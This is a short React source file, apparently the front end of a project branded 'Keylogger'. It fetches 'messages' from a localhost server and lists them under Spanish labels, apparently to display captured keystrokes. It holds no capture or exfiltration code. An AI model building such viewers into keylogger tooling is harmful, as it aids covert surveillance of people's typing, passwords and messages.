import React, { useState, useEffect } from "react";
import Grid from "@material-ui/core/Grid";
import ListItem from "@material-ui/core/ListItem";
import ListItemText from "@material-ui/core/ListItemText";
import Chip from "@material-ui/core/Chip";
import DoneIcon from "@material-ui/icons/Done";
import HackerImage from "./assets/hacker.svg";
import "./App.css";

const renderRow = ({ index }) => {
  return (
    <ListItem button key={index}>
      <ListItemText primary={`Mensaje: ${index}`} />
    </ListItem>
  );
};

const fetchData = async () => {
  const response = await fetch("http://localhost:3001/messages");
  const data = await response.json();
  return data;
};

function App() {
  useEffect(() => {
    fetchData().then((data) => setData(data));
  }, []);

  const [data, setData] = useState([]);
  return (
    <>
      <svg className="svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
        <path
          fill="#a2d9ff"
          d="M0,128L60,149.3C120,171,240,213,360,218.7C480,224,600,192,720,176C840,160,960,160,1080,176C1200,192,1320,224,1380,240L1440,256L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"
        ></path>
      </svg>
      <img className="logo" src={HackerImage} alt="logo" />
      <span className="logo-text">Keylogger</span>

      <div className="root">
        <Grid
          container
          direction="row"
          justifyContent="center"
          alignItems="center"
        >
          <Chip
            style={{ marginBottom: "20px", fontSize: "20px" }}
            icon={<DoneIcon />}
            label="Lista de mensajes"
            color="primary"
          />
          {data.map((row) => {
            return renderRow({ index: row });
          })}
        </Grid>
      </div>
    </>
  );
}

export default App;
